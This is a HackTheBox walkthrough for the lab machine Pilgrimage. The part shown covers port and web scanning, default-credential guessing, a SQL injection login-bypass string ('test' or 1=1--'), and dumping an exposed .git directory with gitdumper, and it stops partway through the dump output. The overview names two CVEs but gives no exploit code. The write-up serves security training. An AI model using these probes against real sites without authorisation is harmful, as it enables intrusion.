
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pilgrimage - HTB</title>
    <link rel="stylesheet" href="/styles.css">
    <link rel="stylesheet" href="/writeups.css">
    <link rel="stylesheet" href="/monokai.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/writeups.html">WriteUPs</a></li>
                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                <li><a href="/about.html">About me</a></li>
            </ul>
        </nav>
    </header>
    <section class="writeup-content">
        <div class="container">
            <div class="writeup-panel">
                <img src="/writeups/htb/easy/pilgrimage/img/pilgrimage.png" alt="Machine Icon" class="machine-icon-circle">
                <h2>Pilgrimage - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links">
                    <li><a href="https://app.hackthebox.com/machines/Pilgrimage">HackTheBox</a></li>
                </ul>
            </div>
            <div class="writeup-content-main">
                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Pilgrimage</span>
<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Easy</span>
<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2023</span>
</pre></div>
<h3><br/>About Pilgrimage</h3><br/>
Pilgrimage is an easy difficulty machine on HackTheBox, exposing an HTTP service on port 80. Our initial step involves dumping a <code>.git</code> directory to retrieve the website's source code. Upon examination, we discovered that the website employs a vulnerable version of ImageMagick for converting uploaded images, presenting an opportunity for reading system files.<br/><br/>
<h3><br>Shell as emily</br></h3><br>
By exploiting the <code>CVE-2022-44268</code>, we successfully gain the ability to read system files. Leveraging this vulnerability, we accessed a database file whose location was exposed in the source code. Extracting information from the database allowed us to obtain credentials for the <code>emily</code> user. Subsequently, we gained access to the system as <code>emily</code> through the SSH service using these credentials.<br/><br/>
<h3><br>Shell as root</br></h3><br>
The <code>root</code> user is running a script that executes a vulnerable version of <code>binwalk</code>. By exploiting the <code>CVE-2022-4510</code> vulnerability, we achieve command execution as the <code>root</code> user.<br/><br/>
<h3><br>Recon</br></h3><br>
At first, let's conduct a port scan to identify open ports on the victim machine. Ports serve as the channels through which services are exposed.<br/><br/>
To execute this scan, we will utilize the <code>nmap</code> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="mf">10.10.11.219</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.219</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.14</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">57784</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">7749</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
</pre></div>

After completing the scan, we observed that ports 80 and 22 are open on the victim machine, typically associated with HTTP and SSH services, respectively.<br/><br/>
Understanding the open ports on the victim machine, our next step involves obtaining information about services and technologies working on these ports. Once again, we will employ <code>nmap</code> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">22</span> <span class="mf">10.10.11.219</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.219</span> <span class="p">(</span><span class="mf">10.10.11.219</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.31</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>

<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.4</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">5</span><span class="o">+</span><span class="n">deb11u1</span> <span class="p">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">3072</span> <span class="mi">20</span><span class="p">:</span><span class="n">be</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">d2</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="n">c1</span><span class="p">:</span><span class="n">b7</span><span class="p">:</span><span class="n">e9</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="n">f1</span><span class="p">:</span><span class="mi">68</span><span class="p">:</span><span class="n">f3</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">0</span><span class="n">e</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="n">a8</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="mi">9</span><span class="n">b</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">70</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="n">af</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">d1</span><span class="p">:</span><span class="mi">4</span><span class="n">e</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">3</span><span class="n">c</span><span class="p">:</span><span class="mi">70</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="n">b4</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="mi">2</span><span class="n">c</span><span class="p">:</span><span class="n">c8</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">98</span><span class="p">:</span><span class="mi">04</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
</pre></div>

When accessing the website via the victim machine's IP address, we immediately notice a leaked domain, <code>pilgrimage.htb</code>. Since the domain couldn't be resolved, we need to add an entry to our <code>/etc/hosts</code> file, mapping it to the IP address of the victim machine.<br/><br/>
Once  the domain can be resolved, we will rerun the scan to identify technologies and services once again.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">22</span> <span class="mf">10.10.11.219</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.219</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>

<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.4</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">5</span><span class="o">+</span><span class="n">deb11u1</span> <span class="p">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">3072</span> <span class="mi">20</span><span class="p">:</span><span class="n">be</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">d2</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="n">c1</span><span class="p">:</span><span class="n">b7</span><span class="p">:</span><span class="n">e9</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="n">f1</span><span class="p">:</span><span class="mi">68</span><span class="p">:</span><span class="n">f3</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">0</span><span class="n">e</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="n">a8</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="mi">9</span><span class="n">b</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">70</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="n">af</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">d1</span><span class="p">:</span><span class="mi">4</span><span class="n">e</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">3</span><span class="n">c</span><span class="p">:</span><span class="mi">70</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="n">b4</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="mi">2</span><span class="n">c</span><span class="p">:</span><span class="n">c8</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">98</span><span class="p">:</span><span class="mi">04</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">git</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mf">10.10.11.219</span><span class="p">:</span><span class="mi">80</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span>
<span class="o">|</span>     <span class="n">Git</span> <span class="n">repository</span> <span class="n">found</span><span class="err">!</span>
<span class="o">|</span>     <span class="n">Repository</span> <span class="n">description</span><span class="p">:</span> <span class="n">Unnamed</span> <span class="n">repository</span><span class="p">;</span> <span class="n">edit</span> <span class="n">this</span> <span class="n">file</span> <span class="s1">'description'</span> <span class="n">to</span> <span class="n">name</span> <span class="n">the</span><span class="o">...</span>
<span class="o">|</span><span class="n">_</span>    <span class="n">Last</span> <span class="n">commit</span> <span class="n">message</span><span class="p">:</span> <span class="n">Pilgrimage</span> <span class="n">image</span> <span class="n">shrinking</span> <span class="n">service</span> <span class="n">initial</span> <span class="n">commit</span><span class="o">.</span> <span class="c1"># Please ...</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">cookie</span><span class="o">-</span><span class="n">flags</span><span class="p">:</span> 
<span class="o">|</span>   <span class="o">/</span><span class="p">:</span> 
<span class="o">|</span>     <span class="n">PHPSESSID</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>      <span class="n">httponly</span> <span class="n">flag</span> <span class="ow">not</span> <span class="nb">set</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Pilgrimage</span> <span class="o">-</span> <span class="n">Shrink</span> <span class="n">Your</span> <span class="n">Images</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
</pre></div>

As the domain is now resolvable, the <code>nmap</code> tool can conduct scans on the website. During this process, it identified a <code>.git</code> directory, suggesting a possible association with Git repositories that might be exploitable in the future.<br/><br/>
<h3><br>Web Application</br></h3><br>
Prior to accessing the website through our browser, I will conduct a scan to identify the technologies employed on the site. To achieve this, I will utilize the <code>whatweb</code> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.219</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.219</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.219</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Cookies</span><span class="p">[</span><span class="n">PHPSESSID</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.219</span><span class="p">],</span> <span class="n">JQuery</span><span class="p">,</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Pilgrimage</span> <span class="o">-</span> <span class="n">Shrink</span> <span class="n">Your</span> <span class="n">Images</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
</pre></div>

There is no interesting information in this output. However, it never hurts to try.<br/><br/>
Upon accessing the website through our browser, we observe the following content:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/2.png"/><br/><br/>
Pilgrimage offers a free online "image shrinker". An "image shrinker" is a tool that makes images smaller. It helps reduce the storage space images take up and makes them load faster on websites or other applications.<br/><br/>
I think we're able to upload some images and make them smaller, but first, let's take a look at the page. <br/><br/>
<h4>Login Section</h4>
In the main page, it says that we can save our images using an account. Before going to the <code>register</code> section, let's try to guess credentials on the <code>login</code> section:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/3.png"/><br/><br/>
There are two fields to fill in, let's try common credentials like <code>admin/admin</code>, <code>guest/guest</code>, etc.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/4.png"/><br/><br/>
Upon attempting to use these credentials, we are unable to access these accounts. Since the error message is not descriptive, it is unclear whether these users exist.<br/><br/>
Let's try some SQL Injection queries to test if we're able to bypass this authentication panel:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">test</span><span class="s1">' or 1=1--</span>
</pre></div>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/5.png"/><br/><br/>
It didn't work. I've tried some other injections, but I was unable to elicit a different response.<br/><br/>
Let's create a new account in the <code>register</code> section:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/6.png"/><br/><br/>
Once we create a new account, we get access to a dashboard where uploaded images will be listed:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/7.png"/><br/><br/>
Next, we will upload an example image:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/8.png"/><br/><br/>
Once I click <code>shrink</code> bottom I got a successful response:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/9.png"/><br/><br/>
It displays an URL to the <code>shrunk</code> directory where the shrunked image is stored:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/10.png"/><br/><br/>
I downloaded this image and compared the <code>md5</code> hashes to verify whether the files are different, indicating any changes or manipulation to the image.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">md5sum</span> <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span>
<span class="mi">465784178831519</span><span class="n">a6c1c549ee6a54cd8</span>  <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span>
<span class="n">e76583dbd4c0444ac86ad343313f3c2a</span>  <span class="n">example</span><span class="o">.</span><span class="n">png</span>
</pre></div>

The <code>md5</code> hashes are different for each file, indicating a change in the <code>shrinked</code> image. Additionally, upon comparing their sizes, I observed that the <code>shrinked</code> file is smaller, confirming the successful functioning of the page.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">du</span> <span class="o">-</span><span class="n">hc</span> <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span>
<span class="mi">28</span><span class="n">K</span>  <span class="mi">6565</span><span class="n">d789cd6f9</span><span class="o">.</span><span class="n">png</span>
<span class="mi">44</span><span class="n">K</span>  <span class="n">example</span><span class="o">.</span><span class="n">png</span>
<span class="mi">72</span><span class="n">K</span>  <span class="n">total</span>
</pre></div>

With this information, we are aware that the website is utilizing tools to reduce image size. Keeping this in mind is crucial for exploiting the machine.<br/><br/>
<h3><br>Git Dumping</br></h3><br>
Recalling the <code>nmap</code> report, there is a <code>.git</code> directory on the website. It could be interesting to extract its contents, as we might be able to obtain the website source code.<br/><br/>
The <a href="https://github.com/internetwache/GitTools">GitTools</a> repository contains useful tools to automate the process of extracting <code>.git</code> repositories<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">internetwache</span><span class="o">/</span><span class="n">GitTools</span>
<span class="n">Cloning</span> <span class="n">into</span> <span class="s1">'GitTools'</span><span class="o">...</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Enumerating</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">242</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Counting</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">33</span><span class="o">/</span><span class="mi">33</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Compressing</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">23</span><span class="o">/</span><span class="mi">23</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Total</span> <span class="mi">242</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">9</span><span class="p">),</span> <span class="n">reused</span> <span class="mi">27</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">7</span><span class="p">),</span> <span class="n">pack</span><span class="o">-</span><span class="n">reused</span> <span class="mi">209</span>
<span class="n">Receiving</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">242</span><span class="o">/</span><span class="mi">242</span><span class="p">),</span> <span class="mf">56.46</span> <span class="n">KiB</span> <span class="o">|</span> <span class="mf">642.00</span> <span class="n">KiB</span><span class="o">/</span><span class="n">s</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
<span class="n">Resolving</span> <span class="n">deltas</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">88</span><span class="o">/</span><span class="mi">88</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
<span class="nd">elswix@kali</span><span class="err">$</span>
</pre></div>

First, we need to use the <code>gitdumper.sh</code> tool to dump the <code>.git</code> directory:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="o">./</span><span class="n">gitdumper</span><span class="o">.</span><span class="n">sh</span>
<span class="c1">###########</span>
<span class="c1"># GitDumper is part of https://github.com/internetwache/GitTools</span>
<span class="c1">#</span>
<span class="c1"># Developed and maintained by @gehaxelt from @internetwache</span>
<span class="c1">#</span>
<span class="c1"># Use at your own risk. Usage might be illegal in certain circumstances. </span>
<span class="c1"># Only for educational purposes!</span>
<span class="c1">###########</span>


<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">USAGE</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">target</span><span class="o">.</span><span class="n">tld</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span> <span class="n">dest</span><span class="o">-</span><span class="nb">dir</span> <span class="p">[</span><span class="o">--</span><span class="n">git</span><span class="o">-</span><span class="nb">dir</span><span class="o">=</span><span class="n">otherdir</span><span class="p">]</span>
        <span class="o">--</span><span class="n">git</span><span class="o">-</span><span class="nb">dir</span><span class="o">=</span><span class="n">otherdir</span>       <span class="n">Change</span> <span class="n">the</span> <span class="n">git</span> <span class="n">folder</span> <span class="n">name</span><span class="o">.</span> <span class="n">Default</span><span class="p">:</span> <span class="o">.</span><span class="n">git</span>
</pre></div>

We need to specify a URL and a destination directory. I will save the content in a folder named <code>Pilgrimage</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">GitTools</span><span class="o">/</span><span class="n">Dumper</span><span class="o">/</span><span class="n">gitdumper</span><span class="o">.</span><span class="n">sh</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span> <span class="n">Pilgrimage</span>
<span class="c1">###########</span>
<span class="c1"># GitDumper is part of https://github.com/internetwache/GitTools</span>
<span class="c1">#</span>
<span class="c1"># Developed and maintained by @gehaxelt from @internetwache</span>
<span class="c1">#</span>
<span class="c1"># Use at your own risk. Usage might be illegal in certain circumstances. </span>
<span class="c1"># Only for educational purposes!</span>
<span class="c1">###########</span>


<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Destination</span> <span class="n">folder</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">exist</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Creating</span> <span class="o">../../</span><span class="n">Pilgrimage</span><span class="o">/.</span><span class="n">git</span><span class="o">/</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">HEAD</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">info</span><span class="o">/</span><span class="n">packs</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">description</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">config</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">COMMIT_EDITMSG</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">index</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">packed</span><span class="o">-</span><span class="n">refs</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">refs</span><span class="o">/</span><span class="n">heads</span><span class="o">/</span><span class="n">master</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">refs</span><span class="o">/</span><span class="n">remotes</span><span class="o">/</span><span class="n">origin</span><span class="o">/</span><span class="n">HEAD</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">refs</span><span class="o">/</span><span class="n">stash</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">logs</span><span class="o">/</span><span class="n">HEAD</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">logs</span><span class="o">/</span><span class="n">refs</span><span class="o">/</span><span class="n">heads</span><span class="o">/</span><span class="n">master</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">logs</span><span class="o">/</span><span class="n">refs</span><span class="o">/</span><span class="n">remotes</span><span class="o">/</span><span class="n">origin</span><span class="o">/</span><span class="n">HEAD</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">info</span><span class="o">/</span><span class="n">refs</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">info</span><span class="o">/</span><span class="n">exclude</span>
